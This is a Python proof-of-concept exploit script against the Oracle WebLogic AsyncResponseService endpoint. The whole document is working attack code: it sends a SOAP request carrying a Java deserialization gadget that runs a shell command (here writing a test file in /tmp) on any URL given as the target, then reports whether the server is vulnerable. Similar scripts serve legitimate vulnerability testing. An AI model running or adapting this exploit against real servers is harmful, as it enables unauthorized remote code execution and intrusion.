#!/usr/bin/env python3

import requests
import sys

request_headers = {"Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Accept-Language": "en", "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)", "Connection": "close", "Content-Type": "text/xml"}
path='/_async/AsyncResponseService'
payload='<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><class><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string><void><string>echo Test &gt; /tmp/test.txt</string></void></class></java>    </work:WorkContext>   </soapenv:Header>   <soapenv:Body>      <asy:onAsyncDelivery/>   </soapenv:Body></soapenv:Envelope>'
url = sys.argv[1]



try:
    response = requests.post(url+path, headers=request_headers, data=payload)
    print(response.content)
    if(response.status_code==202):
        print('[+]'+url+' server with vul.')
    else:
        print('Vulnerability not found')
except requests.exceptions.RequestException as e:
    print('[-]'+url+' Time out')
    #continue

print('\n\nPOC executed with Successful.')
